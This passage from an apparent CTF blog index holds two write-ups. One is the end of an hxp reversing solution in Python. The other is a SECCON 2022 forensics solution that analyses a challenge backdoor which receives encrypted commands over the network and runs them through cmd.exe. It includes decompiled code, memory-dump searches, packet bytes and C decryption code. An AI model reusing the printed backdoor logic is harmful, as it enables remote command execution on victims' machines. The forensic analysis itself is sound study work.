f[XX]^(f[XX]&amp;gt;&amp;gt;1) -&amp;gt; xor(f[XX])## f[XX]=(((f[XX]*0x0802&amp;amp;0x22110)|(f[XX]*0x8020&amp;amp;0x88440))*0x10101&amp;gt;&amp;gt;16)&amp;amp;0xff -&amp;gt; inv(f[XX])There are 7 major types of operations. +, -, ~, ror, rol, xor can be easily reversed.In case of xoring with itself after rsh 1, MSB can be found, so inverse calculation is possible if xor in turn. I made a separate function to calculate the inverse.The last bit operation can be reversed by creating a table for values up to 0xff in a one-to-one correspondence.import reans = 0xd19ee193b461fd8d1452e7659acb1f47dc3ed445c8eb4ff191b1abfa7969ans = list(ans.to_bytes(30,byteorder=&#39;big&#39;))def xor(x): mask = 0b10000000 prev = mask &amp;amp; x out = prev for _ in range(7): mask &amp;gt;&amp;gt;= 1 prev &amp;gt;&amp;gt;=1 out |= (prev ^ x) &amp;amp; mask prev = out &amp;amp; mask return outinv = {}for i in range(0x100): inv[(((i*0x0802&amp;amp;0x22110)|(i*0x8020&amp;amp;0x88440))*0x10101&amp;gt;&amp;gt;16)&amp;amp;0xff] = icode = &quot;&quot;&quot;f[17]+=f[5]f[17]&amp;amp;=0xff...f[0]=~f[0]&amp;amp;0xff&quot;&quot;&quot;.split(&#39;\\n&#39;)code = code[::-1]new_code = []for line in code: if line.find(&#39;+=&#39;) != -1: var = re.match(r&#39;(f\\[[0-9]+\\])&#39;,line)[0] line = line.replace(&#39;+=&#39;, &#39;-=&#39;) line += &quot;\\n&quot; line += f&quot;{var}&amp;amp;= 0xff&quot; elif line.find(&#39;-=&#39;) != -1: var = re.match(r&#39;(f\\[[0-9]+\\])&#39;,line)[0] line = line.replace(&#39;-=&#39;, &#39;+=&#39;) line += &quot;\\n&quot; line += f&quot;{var} &amp;amp;= 0xff&quot; elif line.find(&#39;^&#39;) != -1 and line.find(&#39;&amp;gt;&amp;gt;&#39;) != -1: var = re.match(r&#39;(f\\[[0-9]+\\])&#39;,line)[0] line = f&quot;{var} = xor({var})&quot; elif line.find(&#39;0x88440&#39;) != -1: var = re.match(r&#39;(f\\[[0-9]+\\])&#39;,line)[0] line = f&quot;{var} = inv[{var}&amp;amp;0xff]&quot; elif line.find(&#39;|&#39;) != -1: var = re.match(r&#39;(f\\[[0-9]+\\])&#39;,line)[0] if line.find(&#39;&amp;lt;&amp;lt;1&#39;) != -1: ## to ror line = f&quot;{var} = {var}&amp;gt;&amp;gt;1|({var}&amp;lt;&amp;lt;7&amp;amp;0xff)&quot; else: ## to rol line = f&quot;{var} = {var}&amp;gt;&amp;gt;7|({var}&amp;lt;&amp;lt;1&amp;amp;0xff)&quot; elif line.find(&#39;~&#39;) != -1: var = re.match(r&#39;(f\\[[0-9]+\\])&#39;,line)[0] line = f&quot;{var} = ~{var}&amp;amp;0xff&quot; elif line.find(&#39;^&#39;) != -1: pass else: continue new_code.append(line)f = ans[:]for line in new_code: exec(line)print(bytes(f))After collecting and inverting the output code, converting each into an inverse and executing it with the exec function, you can see that the flag is decrypted. hxp{Cann0t_f1nd_m0dule_‘fl4g’}" }, { "title": "(CTF) 2022 Seccon Doroboh writeup", "url": "/posts/doroboh-01b191dc0ea34ed6b0841d80fde8a6f0/", "categories": "CTF", "tags": "writeup", "date": "2022-12-05 20:19:36 +0900", "snippet": "대회기간에는 못풀었는데 아쉬워서 풀이 참고해 적어봄The following diagram discribes what each file is.Do not run araiguma.exe unless you fully understand the logic.+-- Victim Machine --+ +-- Attacker Machine --+| +--------------+ | | +-------------+ || | araiguma.exe |&amp;lt;-------------&amp;gt;| kitsune.exe | || +--------------+ | ^ | +-------------+ || ^ | | | |+--------|-----------+ | +----------------------+ | | Memory | | Packet Dump | | Capture | | [ araiguma.DMP ] [ network.pcapng ]바이너리 덤프파일, 네트워크 통신기록, 바이너리가 주어진다.네트워크 통신기록 → 키교환, 암호화된 명령어 확인 가능바이너리 덤프파일 → 메모리에 RC4 키 확인 가능 ( 명령어실행결과(플래그) 가 있어서 언인텐 발생 )analysis[1] prepare keyCryptAcquireContext(&amp;amp;provider, 0i64, &quot;Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider&quot;, 13i64, -268435456) )CryptGenKey(provider, 0xAA02u, 0x2000041u, &amp;amp;public)CryptSetKeyParam(public, 0xBu, &amp;amp;v15, 0) //KP_PCryptSetKeyParam(public, 0xCu, &amp;amp;v13, 0) //KP_GCryptSetKeyParam(public, 0xEu, 0i64, 0) //KP_XCryptExportKey(public, 0i64, 6u, 0, 0i64, &amp;amp;Size_4) // get size keyblob = HeapAlloc(ProcessHeap, 0, Size_4);CryptExportKey(public, 0i64, 6u, 0, keyblob, &amp;amp;Size_4) // get key blob[2] prepare socket connectionWSAStartup(2u, &amp;amp;v7);fd = socket(2, 1, 0);v6.sa_family = 2;*v6.sa_data = htons(0x1F90u);inet_pton(2, &quot;192.168.3.6&quot;, &amp;amp;v6.sa_data[2]); // 192.168.3.6:8080connect(fd, &amp;amp;v6, 16)[3] exchange keysend(fd, &amp;amp;Size_4, 4, 0);send(fd, keyblob, Size_4, 0); // send size / keyblobrecv(fd, &amp;amp;Size, 4, 0);v18 = HeapAlloc(ProcessHeap, 0, Size);recv(fd, v18, Size, 0); // get size / keyblobCryptImportKey(provider, v18, Size, public, 0, &amp;amp;key) // calc keyv5 = 26625;CryptSetKeyParam(key, 7u, &amp;amp;v5, 0) // Convert ALG_AGREEDKEY_ANY to CALG_RC4.memset(v18, 0, Size);[4] receive command, decrypt and executewhile ( recv(fd, &amp;amp;v4, 4, 0) == 4 ){ cmd = HeapAlloc(ProcessHeap, 0, v4); if ( !cmd ) break; recv(fd, cmd, v4, 0); if ( !CryptDecrypt(key, 0i64, 1, 0, cmd, &amp;amp;v4) ) { HeapFree(ProcessHeap, 0, cmd); break; } ShellExecuteA(0i64, &quot;open&quot;, &quot;cmd.exe&quot;, cmd, 0i64, 0); memset(cmd, 0, v4); HeapFree(ProcessHeap, 0, cmd);}... release resources바이너리는 생각보다 간단하다. 키를 준비한 뒤 교환하고 암호화된 명령어를 받아 복호화해서 실행하는 것밖에 없다.키를 교환한 뒤, CryptSetKeyParam 함수로 암호화방식을 RC4 로 바꾼다.그러면 RC4키의 주소는 key+0x58 (RC4 header) → RC4 header + 0x48 에 저장되어있다.하지만 디버깅으로 확인해보면, key+0x58 에 있는 주소는 암호화되어있는 것을 확인할 수 있는데, ptr-yudai 선생님의 말에 따르면credential provider dll 을 분석해보면, 키가 0xA2491D83D96214A0 임을 알 수 있다고 하신다.[+] 2022.12.05cryptsp.dll.CryptAcquireContextA 에서 xor 하는 부분을 찾으려했는데, 이 함수에서는 찾을 수 없어서 사용하는 부분인 provider 을 사용하는 함수 ( CryptGenKey ) 를 분석했다.hprov+16 → dessen.dll.CPGenKeyhprov+0xE0 → xored addressdessen.dll.CPGenKey 함수에서 xor 상수를 확인할 수 있었다.밑에있는 사진은 분석 바이너리처럼 키성생 후 RC4 로 변환하는 것을 디버깅한 과정이다. +0x58 에 있는 값과 키를 xor 하면 0x1B832995460 이라는 주소가 나온다. RC4 convert 전/후, 각각 사진 2개, 16바이트만 잘라서 사용하는 것을 확인할 수 있다.헤더의 signature → 0xbadf 임을 알았으니, 바이너리덤프파일을 windbg 로 열어서 검색해보자||2:2:012&amp;gt; s 00000000`00000000 L1000000 df ba00000000`000f4ba0 df ba 00 00 00 00 00 00-d0 9a 10 00 00 00 00 00 ................00000000`000f54f0 df ba 00 00 00 00 00 00-d0 9a 10 00 00 00 00 00 ................||2:2:012&amp;gt; dq 00000000`000f54f000000000`000f54f0 00000000`0000badf 00000000`00109ad000000000`000f5500 00006801`00000001 00000000`0000001b00000000`000f5510 00000000`00000000 00000000`0000000000000000`000f5520 00000000`00000000 00000000`0000000000000000`000f5530 00000000`00000000 00000000`00113360 &amp;lt;- key pointer00000000`000f5540 00000000`00000010 00000000`0000000000000000`000f5550 00000000`00000000 00000000`0000000000000000`000f5560 00000000`00000000 00000000`00000000||2:2:012&amp;gt; db 00000000`0011336000000000`00113360 f1 f5 85 a0 f3 27 87 ad-54 c0 66 10 af 2f 3a a3 .....&#39;..T.f../:.00000000`00113370 00 00 00 00 00 00 00 00-1d f6 89 be 00 2c 00 88 .............,..00000000`00113380 4c 00 69 00 62 00 72 00-80 33 11 00 00 00 00 00 L.i.b.r..3......00000000`00113390 00 00 00 00 00 00 00 80-13 f6 8b be 00 2d 00 90 .............-..00000000`001133a0 01 00 00 00 00 00 00 00-50 77 12 00 00 00 00 00 ........Pw......00000000`001133b0 00 00 00 00 00 00 00 00-11 f6 b5 be 00 2e 00 88 ................00000000`001133c0 b0 05 00 00 64 00 2e 00-00 00 00 00 00 00 00 00 ....d...........00000000`001133d0 00 00 00 00 00 00 00 00-17 f6 b7 be 00 2f 00 80 ............./..s 0 L100000 df ba위 명령어로 0부터 0x1000000 범위에서 0xbadf 를 검색하면 두 개의 결과가 나오고두 번째 주소에 rc4 키값이 저장되어있는 것을 알 수 있다.위 바이너리에 적힌 아이피로 필터링하여 TCP dump 를 확인해보면 다음과 같은 데이터를 얻을 수 있다.BYTE peer0_0[] = { /* Packet 74 */ // 1. send size0x50, 0x00, 0x00, 0x00 };BYTE peer0_1[] = { /* Packet 76 */ // 2. send public key0x06, 0x02, 0x00, 0x00, 0x02, 0xaa, 0x00, 0x00,0x00, 0x44, 0x48, 0x31, 0x00, 0x02, 0x00, 0x00,0x46, 0xa7, 0x17, 0xb1, 0xd5, 0x45, 0x37, 0xe8,0x62, 0xf6, 0xba, 0x6f, 0x80, 0x9a, 0xed, 0x00,0x21, 0xaf, 0xc4, 0x4b, 0x8c, 0x95, 0xc9, 0xbe,0xc8, 0x09, 0x51, 0x8f, 0x10, 0x00, 0x1c, 0xc9,0x64, 0x89, 0xad, 0x89, 0x14, 0xe1, 0xd4, 0xe0,0x08, 0xaa, 0x60, 0xbe, 0x8f, 0xe3, 0x6f, 0x9b,0x15, 0x6e, 0x35, 0x89, 0x40, 0xbb, 0xc1, 0xaa,0x70, 0x90, 0x98, 0xd9, 0x39, 0x57, 0xe6, 0x37 };BYTE peer1_0[] = { /* Packet 78 */ // 3. recv size0x50, 0x00, 0x00, 0x00 };BYTE buffer[] = { /* Packet 79 */ // 4. recv key0x06, 0x02, 0x00, 0x00, 0x02, 0xaa, 0x00, 0x00,0x00, 0x44, 0x48, 0x31, 0x00, 0x02, 0x00, 0x00,0x28, 0x8f, 0x76, 0x74, 0x9e, 0xc2, 0x0b, 0x9a,0xb1, 0x8c, 0x61, 0x84, 0x18, 0xae, 0x9a, 0x70,0x72, 0x26, 0x18, 0xdc, 0x68, 0x5e, 0x66, 0x7f,0xc0, 0xc1, 0x9b, 0x90, 0x6a, 0x6a, 0xa3, 0xa5,0x71, 0xf4, 0x73, 0xea, 0x0e, 0xaa, 0xda, 0x26,0x9f, 0x29, 0x86, 0x0d, 0x55, 0xdd, 0xcb, 0xa0,0x36, 0x7e, 0xe6, 0xf7, 0xa1, 0xfa, 0xc8, 0x3d,0x2d, 0x73, 0x95, 0x48, 0x29, 0x30, 0xb3, 0xb8 };BYTE cmd1_length = 0x67; /* Packet 87 */ // 5. cmd 1 lengthBYTE cmd1[] = { /* Packet 88 */ // 6. cmd 10x8c, 0x28, 0xc2, 0x0d, 0x02, 0x7a, 0xa8, 0xbc,0x9a, 0x71, 0xb1, 0x07, 0x02, 0x24, 0x21, 0xe9,0x07, 0x34, 0x0d, 0xe0, 0xf9, 0xa4, 0xc5, 0x40,0x61, 0x1f, 0x2d, 0x95, 0xb5, 0x60, 0xf8, 0x43,0x5f, 0xdb, 0x44, 0xec, 0xb3, 0x88, 0x76, 0xdd,0xab, 0x1f, 0xe3, 0xff, 0xca, 0xf2, 0x6a, 0xeb,0x65, 0xb7, 0xf7, 0xf4, 0xd1, 0xd0, 0xbc, 0x6c,0xee, 0xc5, 0x21, 0xc7, 0x7c, 0x27, 0xcd, 0x0f,0xfb, 0xa4, 0xa9, 0xd0, 0x07, 0x22, 0x8c, 0x47,0x82, 0x88, 0xb9, 0x06, 0xb6, 0x4d, 0x83, 0x2b,0xe9, 0x82, 0x2e, 0x12, 0x3e, 0xc4, 0xa5, 0xab,0xbc, 0x15, 0x5a, 0x24, 0xb6, 0x3a, 0x8c, 0x65,0x7c, 0x05, 0xff, 0x61, 0x48, 0x12, 0x4f };BYTE cmd2_length = 0x66;// [] = { /* Packet 315 */ // 7. cmd 2 lengthBYTE cmd2[] = { /* Packet 316 */ // 8. cmd 20x8c, 0x28, 0xc2, 0x0d, 0x02, 0x7a, 0xa8, 0xbc,0x9a, 0x6b, 0xd4, 0x36, 0x24, 0x0c, 0x1d, 0xf7,0x3e, 0x27, 0x14, 0xbf, 0xab, 0xae, 0xfb, 0x7d,0x34, 0x06, 0x35, 0xdf, 0x91, 0x74, 0xe2, 0x47,0x19, 0xdd, 0x3b, 0xcc, 0xe8, 0x95, 0x72, 0xdd,0xad, 0x49, 0xac, 0x8c, 0x93, 0xf1, 0x22, 0xaa,0x61, 0xad, 0xa3, 0xf3, 0xcb, 0x8a, 0xa1, 0x28,0x8b, 0xab, 0x33, 0x95, 0x71, 0x69, 0xfd, 0x04,0xc4, 0x82, 0xa7, 0x97, 0x55, 0x6f, 0xf0, 0x67,0xcc, 0xb2, 0xb0, 0x31, 0xb6, 0x4c, 0x9b, 0x03,0xe5, 0x86, 0x14, 0x20, 0x15, 0xd5, 0xbf, 0xa6,0xa1, 0x19, 0x4b, 0x0c, 0xb9, 0x39, 0x83, 0x2c,0x26, 0x09, 0xf3, 0x18, 0x4f, 0x18 };지금까지 모은 데이터를 이용해 다음과 같이 소스를 작성해서 명령어를 복호화할 수 있다. 주어진 G, P 값 설정하고 임의 키(X) 생성 서버에서 Export 한 키값을 Import 암호화방식 RC4 로 바꾼 뒤 구한 키값으로 overwrite 복호화#pragma comment(lib, &quot;crypt32.lib&quot;)#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;tchar.h&amp;gt;#include &amp;lt;windows.h&amp;gt;#include &amp;lt;Wincrypt.h&amp;gt;BYTE peer0_0[] = { /* Packet 74 */ // 1. send size0x50, 0x00, 0x00, 0x00 };BYTE peer0_1[] = { /* Packet 76 */ // 2. send public key0x06, 0x02, 0x00, 0x00, 0x02, 0xaa, 0x00, 0x00,0x00, 0x44, 0x48, 0x31, 0x00, 0x02, 0x00, 0x00,0x46, 0xa7, 0x17, 0xb1, 0xd5, 0x45, 0x37, 0xe8,0x62, 0xf6, 0xba, 0x6f, 0x80, 0x9a, 0xed, 0x00,0x21, 0xaf, 0xc4, 0x4b, 0x8c, 0x95, 0xc9, 0xbe,0xc8, 0x09, 0x51, 0x8f, 0x10, 0x00, 0x1c, 0xc9,0x64, 0x89, 0xad, 0x89, 0x14, 0xe1, 0xd4, 0xe0,0x08, 0xaa, 0x60, 0xbe, 0x8f, 0xe3, 0x6f, 0x9b,0x15, 0x6e, 0x35, 0x89, 0x40, 0xbb, 0xc1, 0xaa,0x70, 0x90, 0x98, 0xd9, 0x39, 0x57, 0xe6, 0x37 };BYTE peer1_0[] = { /* Packet 78 */ // 3. recv size0x50, 0x00, 0x00, 0x00 };BYTE buffer[] = { /* Packet 79 */ // 4. recv key0x06, 0x02, 0x00, 0x00, 0x02, 0xaa, 0x00, 0x00,0x00, 0x44, 0x48, 0x31, 0x00, 0x02, 0x00, 0x00,0x28, 0x8f, 0x76, 0x74, 0x9e, 0xc2, 0x0b, 0x9a,0xb1, 0x8c, 0x61, 0x84, 0x18, 0xae, 0x9a, 0x70,0x72, 0x26, 0x18, 0xdc, 0x68, 0x5e, 0x66, 0x7f,0xc0, 0xc1, 0x9b, 0x90, 0x6a, 0x6a, 0xa3, 0xa5,0x71, 0xf4, 0x73, 0xea, 0x0e, 0xaa, 0xda, 0x26,0x9f, 0x29, 0x86, 0x0d, 0x55, 0xdd, 0xcb, 0xa0,0x36, 0x7e, 0xe6, 0xf7, 0xa1, 0xfa, 0xc8, 0x3d,0x2d, 0x73, 0x95, 0x48, 0x29, 0x30, 0xb3, 0xb8 };BYTE cmd1_length = 0x67; /* Packet 87 */ // 5. cmd 1 lengthBYTE cmd1[] = { /* Packet 88 */ // 6. cmd 10x8c, 0x28, 0xc2, 0x0d, 0x02, 0x7a, 0xa8, 0xbc,0x9a, 0x71, 0xb1, 0x07, 0x02, 0x24, 0x21, 0xe9,0x07, 0x34, 0x0d, 0xe0, 0xf9, 0xa4, 0xc5, 0x40,0x61, 0x1f, 0x2d, 0x95, 0xb5, 0x60, 0xf8, 0x43,0x5f, 0xdb, 0x44, 0xec, 0xb3, 0x88, 0x76, 0xdd,0xab, 0x1f, 0xe3, 0xff, 0xca, 0xf2, 0x6a, 0xeb,0x65, 0xb7, 0xf7, 0xf4, 0xd1, 0xd0, 0xbc, 0x6c,0xee, 0xc5, 0x21, 0xc7, 0x7c, 0x27, 0xcd, 0x0f,0xfb, 0xa4, 0xa9, 0xd0, 0x07, 0x22, 0x8c, 0x47,0x82, 0x88, 0xb9, 0x06, 0xb6, 0x4d, 0x83, 0x2b,0xe9, 0x82, 0x2e, 0x12, 0x3e, 0xc4, 0xa5, 0xab,0xbc, 0x15, 0x5a, 0x24, 0xb6, 0x3a, 0x8c, 0x65,0x7c, 0x05, 0xff, 0x61, 0x48, 0x12, 0x4f };BYTE cmd2_length = 0x66;// [] = { /* Packet 315 */ // 7. cmd 2 lengthBYTE cmd2[] = { /* Packet 316 */ // 8. cmd 20x8c, 0x28, 0xc2, 0x0d, 0x02, 0x7a, 0xa8, 0xbc,0x9a, 0x6b, 0xd4, 0x36, 0x24, 0x0c, 0x1d, 0xf7,0x3e, 0x27, 0x14, 0xbf, 0xab, 0xae, 0xfb, 0x7d,0x34, 0x06, 0x35, 0xdf, 0x91, 0x74, 0xe2, 0x47,0x19, 0xdd, 0x3b, 0xcc, 0xe8, 0x95, 0x72, 0xdd,0xad, 0x49, 0xac, 0x8c, 0x93, 0xf1, 0x22, 0xaa,0x61, 0xad, 0xa3, 0xf3, 0xcb, 0x8a, 0xa1, 0x28,0x8b, 0xab, 0x33, 0x95, 0x71, 0x69, 0xfd, 0x04,0xc4, 0x82, 0xa7, 0x97, 0x55, 0x6f, 0xf0, 0x67,0xcc, 0xb2, 0xb0, 0x31, 0xb6, 0x4c, 0x9b, 0x03,0xe5, 0x86, 0x14, 0x20, 0x15, 0xd5, 0xbf, 0xa6,0xa1, 0x19, 0x4b, 0x0c, 0xb9, 0x39, 0x83, 0x2c,0x26, 0x09, 0xf3, 0x18, 0x4f, 0x18 };const BYTE g_P[] ={ 0xED, 0xA1, 0x53, 0x9B, 0xD8, 0x26, 0x05, 0x03, 0x3A, 0x88, 0x52, 0x29, 0xF8, 0x77, 0x54, 0xCF, 0x1D, 0xAB, 0x60, 0x3A, 0xB9, 0xB0, 0x1F, 0xE3, 0xA3, 0x69, 0x4E, 0x84, 0xB6, 0x2F, 0x02, 0x20, 0x1F, 0xE1, 0x6E, 0x25, 0xCD, 0xBB, 0x74, 0x56, 0x32, 0x05, 0x02, 0x6A, 0x8F, 0x7B, 0x9A, 0x89, 0x80, 0x52, 0x71, 0xEE, 0xF8, 0xA6, 0x4B, 0x91, 0xB1, 0x35, 0x03, 0x76, 0xC1, 0xCE, 0x21, 0xCF};const BYTE g_G[] ={ 0x14, 0xCF, 0x6B, 0x2F, 0xCA, 0xE9, 0x51, 0xA6, 0xFD, 0x4D, 0xAB, 0xEA, 0x92, 0x29, 0xBB, 0xB8, 0x3F, 0xB4, 0x56, 0x54, 0x1B, 0x8E, 0x7C, 0xE7, 0x1E, 0x68, 0x50, 0x02, 0x4B, 0x44, 0x7B, 0xA3, 0x13, 0xC8, 0x83, 0x69, 0xC0, 0x1A, 0xDE, 0x06, 0x11, 0x6D, 0x0D, 0xAB, 0x93, 0x0F, 0xAE, 0xFB, 0x96, 0x17, 0x77, 0x86, 0x9B, 0x7D, 0xCD, 0x72, 0xCE, 0x1F, 0x80, 0x36, 0x49, 0x06, 0x79, 0x7C};void main(void){ HCRYPTPROV hCryptProv; HCRYPTKEY hCryptKey,key; DATA_BLOB P; DATA_BLOB G; P.cbData = 0x40; P.pbData = (BYTE*)(g_P); G.cbData = 0x40; G.pbData = (BYTE*)(g_G); DWORD Size_4 = NULL; DWORD pbData = 0x6801; CryptAcquireContext(&amp;amp;hCryptProv,NULL,TEXT(&quot;Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider&quot;),13,0xf0000000); CryptGenKey(hCryptProv, 0xaa02, 0x2000041, &amp;amp;hCryptKey); CryptSetKeyParam(hCryptKey, KP_P, (PBYTE)&amp;amp;P, 0); CryptSetKeyParam(hCryptKey, KP_G, (PBYTE)&amp;amp;G, 0); CryptSetKeyParam(hCryptKey, KP_X, 0, 0); CryptImportKey(hCryptProv, buffer, 0x50, hCryptKey, 0, &amp;amp;key); CryptSetKeyParam(key, 7u, (BYTE*)&amp;amp;pbData, 0); // to RC4 /* from ptr-yudai&#39;s source */ BYTE extractedKey[] = { 241, 245, 133, 160, 243, 39, 135, 173, 84, 192, 102, 16, 175, 47, 58, 163 }; unsigned long long enckey = *(unsigned long long*)((char*)key + 0x58); void* ptr_secret = (void*)(enckey ^ 0xA2491D83D96214A0ULL); unsigned char* key_p = (unsigned char*)(*(unsigned long long*)((BYTE*)ptr_secret + 0x48)); memcpy((BYTE*)key_p, extractedKey, 0x10); /* overwrite key from dump file */ /* decrypt commands */ DWORD dwLength = 0; CryptDecrypt(key, 0, 1, 0, cmd1, &amp;amp;dwLength); dwLength = 0x67; CryptDecrypt(key, 0i64, 1, 0, cmd1, &amp;amp;dwLength); puts((char*)cmd1); dwLength = 0x66; CryptDecrypt(key, 0, 1, 0, cmd2, &amp;amp;dwLength); puts((char*)cmd2); }1,2 번 과정에서 굳이 패킷에 있는 데이터를 쓸 필요가 없다. 그냥 임의로 키교환 하고 RC4 키만 바꾸면 되기때문풀이에서는 처음에 0을 넣어서 한 번 호출한 뒤 복호화했더니 cmd1, cmd2 복호화된 값이 정상적으로 나왔다.안그럼 복호화가 이상하게됨https://github.com/maldevel/WinRC4/blob/master/WinRC4/rc4.c다른 소스에서도 먼저 length 에 0을 넣어 한 번 호출한 뒤 복호화하는데, 아직 이유는 모르겠당 /C echo “SECCON{M3m0ry_Dump+P4ck3t_C4ptur3=S0ph1st1c4t3d_F0r3ns1cs}” &amp;gt; C:\\Users\\ctf\\Desktop\\flag.txt /C echo “I regret to say that your computer is pwned… :(“ &amp;gt; C:\\Users\\ctf\\Desktop\\notification.txtptr-yudai’s wirteup (from discord)I focused on analysing RC4 key generation rather than the encrypted DH key.So... unfortunately I don&#39;t know what kind of encryption is used for DH.There is a magic number in the key store (as far as I remember it was ba df 00 00 00 00 00 00).My intended solution is1. Search for magic number in memory2. If offset +58h has XORed pointer, it&#39;s pointing to RC4 key3. The RC4 key has pointer to the actualy key (?) bytearray. (xor key is 0xA2491D83D96214A0, found by reversing credential provider&#39;s dll)4. Extract RC4 key.Now you can decrypt the data bya. Create random RC4 key and get the pointer (handle).b. Follow 2,3c. Replace the key with the key extracted in step 4d. Decrypt the message.#include &amp;lt;windows.h&amp;gt;#include &amp;lt;bcrypt.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#define DHKEYSIZE 512static const BYTE g_P[] = { 0xed, 0xa1, 0x53, 0x9b, 0xd8, 0x26, 0x05, 0x03, 0x3a, 0x88, 0x52, 0x29, 0xf8, 0x77, 0x54, 0xcf, 0x1d, 0xab, 0x60, 0x3a, 0xb9, 0xb0, 0x1f, 0xe3, 0xa3, 0x69, 0x4e, 0x84, 0xb6, 0x2f, 0x02, 0x20, 0x1f, 0xe1, 0x6e, 0x25, 0xcd, 0xbb, 0x74, 0x56, 0x32, 0x05, 0x02, 0x6a, 0x8f, 0x7b, 0x9a, 0x89, 0x80, 0x52, 0x71, 0xee, 0xf8, 0xa6, 0x4b, 0x91, 0xb1, 0x35, 0x03, 0x76, 0xc1, 0xce, 0x21, 0xcf};static const BYTE g_G[] = { 0x14, 0xcf, 0x6b, 0x2f, 0xca, 0xe9, 0x51, 0xa6, 0xfd, 0x4d, 0xab, 0xea, 0x92, 0x29, 0xbb, 0xb8, 0x3f, 0xb4, 0x56, 0x54, 0x1b, 0x8e, 0x7c, 0xe7, 0x1e, 0x68, 0x50, 0x02, 0x4b, 0x44, 0x7b, 0xa3, 0x13, 0xc8, 0x83, 0x69, 0xc0, 0x1a, 0xde, 0x06, 0x11, 0x6d, 0x0d, 0xab, 0x93, 0x0f, 0xae, 0xfb, 0x96, 0x17, 0x77, 0x86, 0x9b, 0x7d, 0xcd, 0x72, 0xce, 0x1f, 0x80, 0x36, 0x49, 0x06, 0x79, 0x7c};static const BYTE extractedKey[] = { 0xF1, 0xF5, 0x85, 0xA0, 0xF3, 0x27, 0x87, 0xAD, 0x54, 0xC0, 0x66, 0x10, 0xAF, 0x2F, 0x3A, 0xA3};int main() { HANDLE hHeap; DATA_BLOB P, G; PBYTE pbKeyBlob; HCRYPTPROV hCryptProv1, hCryptProv2; HCRYPTKEY hCryptKey1, hCryptKey2, hSessionKey; P.cbData = DHKEYSIZE / 8; P.pbData = (BYTE*)(g_P); G.cbData = DHKEYSIZE / 8; G.pbData = (BYTE*)(g_G); /* Create DH container */ if (!CryptAcquireContext(&amp;amp;hCryptProv1, NULL, MS_ENH_DSS_DH_PROV, PROV_DSS_DH, CRYPT_VERIFYCONTEXT)) return 1; if (!CryptAcquireContext(&amp;amp;hCryptProv2, NULL, MS_ENH_DSS_DH_PROV, PROV_DSS_DH, CRYPT_VERIFYCONTEXT)) return 1; /* Create a new key */ if (!CryptGenKey(hCryptProv1, CALG_DH_EPHEM, DHKEYSIZE &amp;lt;&amp;lt; 16 | CRYPT_EXPORTABLE | CRYPT_PREGEN, &amp;amp;hCryptKey1)) return 1; if (!CryptGenKey(hCryptProv2, CALG_DH_EPHEM, DHKEYSIZE &amp;lt;&amp;lt; 16 | CRYPT_EXPORTABLE | CRYPT_PREGEN, &amp;amp;hCryptKey2)) return 1; /* Set P and G, generate X */ if (!CryptSetKeyParam(hCryptKey1, KP_P, (PBYTE)&amp;amp;P, 0)) return 1; if (!CryptSetKeyParam(hCryptKey1, KP_G, (PBYTE)&amp;amp;G, 0)) return 1; if (!CryptSetKeyParam(hCryptKey1, KP_X, NULL, 0)) return 1; if (!CryptSetKeyParam(hCryptKey2, KP_P, (PBYTE)&amp;amp;P, 0)) return 1; if (!CryptSetKeyParam(hCryptKey2, KP_G, (PBYTE)&amp;amp;G, 0)) return 1; if (!CryptSetKeyParam(hCryptKey2, KP_X, NULL, 0)) return 1; /* Retrieve public key */ DWORD dwDataLen; if (!CryptExportKey(hCryptKey2, 0, PUBLICKEYBLOB, 0, NULL, &amp;amp;dwDataLen)) return 1; if (!(pbKeyBlob = malloc(dwDataLen))) return 1; if (!CryptExportKey(hCryptKey2, 0, PUBLICKEYBLOB, 0, pbKeyBlob, &amp;amp;dwDataLen)) return 1; /* Import key */ if (!CryptImportKey(hCryptProv1, pbKeyBlob, dwDataLen, hCryptKey1, 0, &amp;amp;hSessionKey)) return 1; /* Now key is shared */ ALG_ID algid = CALG_RC4; if (!CryptSetKeyParam(hSessionKey, KP_ALGID, (PBYTE)&amp;amp;algid, 0)) return 1; unsigned long long enckey = *(unsigned long long*)(((void*)hSessionKey) + 0x58); printf(&quot;[+] encrypted pointer = %p\\n&quot;, enckey); void *ptr_secret = (void*)(enckey ^ 0xA2491D83D96214A0ULL); printf(&quot;[+] secret @ %p\\n&quot;, ptr_secret); // assert (*(u64*)ptr_secret == 0xbadf) // magic number unsigned char *key = (unsigned char*)(*(unsigned long long*)(ptr_secret + 0x48)); printf(&quot;[+] key @ %p\\n&quot;, key); memcpy(key, extractedKey, 0x10); puts(&quot;[+] Successfully overwritten secret!&quot;); DWORD dwLength; /* Decrypt command 1 */ unsigned char cmd1[] = {0x8c, 0x28, 0xc2, 0x0d, 0x02, 0x7a, 0xa8, 0xbc, 0x9a, 0x71, 0xb1, 0x07, 0x02, 0x24, 0x21, 0xe9, 0x07, 0x34, 0x0d, 0xe0, 0xf9, 0xa4, 0xc5, 0x40, 0x61, 0x1f, 0x2d, 0x95, 0xb5, 0x60, 0xf8, 0x43, 0x5f, 0xdb, 0x44, 0xec, 0xb3, 0x88, 0x76, 0xdd, 0xab, 0x1f, 0xe3, 0xff, 0xca, 0xf2, 0x6a, 0xeb, 0x65, 0xb7, 0xf7, 0xf4, 0xd1, 0xd0, 0xbc, 0x6c, 0xee, 0xc5, 0x21, 0xc7, 0x7c, 0x27, 0xcd, 0x0f, 0xfb, 0xa4, 0xa9, 0xd0, 0x07, 0x22, 0x8c, 0x47, 0x82, 0x88, 0xb9, 0x06, 0xb6, 0x4d, 0x83, 0x2b, 0xe9, 0x82, 0x2e, 0x12, 0x3e, 0xc4, 0xa5, 0xab, 0xbc, 0x15, 0x5a, 0x24, 0xb6, 0x3a, 0x8c, 0x65, 0x7c, 0x05, 0xff, 0x61, 0x48, 0x12, 0x4f}; dwLength = 0; if (!CryptDecrypt(hSessionKey, 0, TRUE, 0, cmd1, &amp;amp;dwLength)) return 1; dwLength = 0x67; if (!CryptDecrypt(hSessionKey, 0, TRUE, 0, cmd1, &amp;amp;dwLength)) return 1; puts(cmd1); /* Decrypt command 2 */ unsigned char cmd2[] = {0x8c, 0x28, 0xc2, 0x0d, 0x02, 0x7a, 0xa8, 0xbc, 0x9a, 0x6b, 0xd4, 0x36, 0x24, 0x0c, 0x1d, 0xf7, 0x3e, 0x27, 0x14, 0xbf, 0xab, 0xae, 0xfb, 0x7d, 0x34, 0x06, 0x35, 0xdf, 0x91, 